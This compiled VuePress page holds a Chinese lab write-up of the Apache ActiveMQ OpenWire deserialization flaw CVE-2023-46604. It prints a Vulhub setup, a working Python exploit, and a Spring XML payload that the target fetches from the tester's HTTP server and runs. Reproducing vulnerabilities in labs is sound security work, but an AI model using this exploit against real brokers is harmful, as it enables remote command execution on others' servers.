import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as u,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},i=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。",-1),k=n("p",null,"OpenWire协议在ActiveMQ中被用于多语言客户端与服务端通信。在Apache ActiveMQ 5.18.2版本及以前，OpenWire协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作 OpenWire 协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。",-1),d=n("p",null,"参考链接：",-1),b={href:"https://activemq.apache.org/news/cve-2023-46604",target:"_blank",rel:"noopener noreferrer"},m={href:"https://xz.aliyun.com/t/12929",target:"_blank",rel:"noopener noreferrer"},v={href:"https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/",target:"_blank",rel:"noopener noreferrer"},g={href:"https://forum.butian.net/share/2566",target:"_blank",rel:"noopener noreferrer"},h=p(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>ActiveMQ运行后，默认监听如下两个端口：</p><table><thead><tr><th>默认端口</th><th>默认条件</th></tr></thead><tbody><tr><td>8161 web</td><td>需配置才可远程访问</td></tr><tr><td>61616 tcp</td><td>远程访问</td></tr></tbody></table><p>反序列化漏洞出现在61616端口中。</p><p>Vulhub 执行如下命令启动一个ActiveMQ 5.17.3版本服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:8161</code>检查服务是否运行成功。但实际上利用该漏洞，并不需要能够访问8161端口。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240104094726313.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,9),_={href:"https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/poc.xml",target:"_blank",rel:"noopener noreferrer"},f=p(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">6666</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,1),x={href:"https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/poc.py",target:"_blank",rel:"noopener noreferrer"},y=p(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>python3 poc.py your-ip <span class="token number">61616</span> http://your-server/poc.xml
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待执行，几分钟后执行完成。进入ActiveMQ容器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker exec cve-2023-46604-activemq-1 ls -l /tmp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可见，<code>touch /tmp/activeMQ-RCE-success</code>已经被成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240104102657021.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2>`,6),w={href:"https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/poc.xml",target:"_blank",rel:"noopener noreferrer"},q=p(`<div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.springframework.org/schema/beans<span class="token punctuation">&quot;</span></span>
       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">&quot;</span></span>
       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>pb<span class="token punctuation">&quot;</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>java.lang.ProcessBuilder<span class="token punctuation">&quot;</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>start<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>touch<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/tmp/activeMQ-RCE-success<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),E={href:"https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2023-46604/poc.py",target:"_blank",rel:"noopener noreferrer"},A=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> io
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> sys


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> xml<span class="token punctuation">)</span><span class="token punctuation">:</span>
    classname <span class="token operator">=</span> <span class="token string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>
    socket_obj <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    socket_obj<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">with</span> socket_obj<span class="token punctuation">:</span>
        out <span class="token operator">=</span> socket_obj<span class="token punctuation">.</span>makefile<span class="token punctuation">(</span><span class="token string">&#39;wb&#39;</span><span class="token punctuation">)</span>
        <span class="token comment"># out = io.BytesIO()  # 创建一个内存中的二进制流</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">&#39;big&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">&#39;big&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&#39;big&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">&#39;big&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&#39;big&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&#39;big&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">&#39;big&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>classname<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&#39;big&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">&#39;big&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>xml<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># print(list(out.getvalue()))</span>
        out<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Please specify the target and port and poc.xml: python3 poc.py 127.0.0.1 61616 &quot;</span>
              <span class="token string">&quot;http://192.168.0.101:8888/poc.xml&quot;</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function C(M,V){const a=o("ExternalLinkIcon");return c(),u("div",null,[i,r,k,d,n("ul",null,[n("li",null,[n("a",b,[s("https://activemq.apache.org/news/cve-2023-46604"),t(a)])]),n("li",null,[n("a",m,[s("https://xz.aliyun.com/t/12929"),t(a)])]),n("li",null,[n("a",v,[s("https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/"),t(a)])]),n("li",null,[n("a",g,[s("https://forum.butian.net/share/2566"),t(a)])])]),h,n("p",null,[s("首先，启动一个HTTP反连服务器，其中包含"),n("a",_,[s("poc.xml"),t(a)]),s("：")]),f,n("p",null,[s("然后，执行"),n("a",x,[s("poc.py"),t(a)]),s("，传入的三个参数分别是目标服务器地址、端口，以及包含poc.xml的反连平台URL：")]),y,n("p",null,[n("a",w,[s("poc.xml"),t(a)])]),q,n("p",null,[n("a",E,[s("poc.py"),t(a)])]),A])}const O=e(l,[["render",C],["__file","Apache ActiveMQ OpenWire 协议反序列化命令执行漏洞 CVE-2023-46604.html.vue"]]);export{O as default};
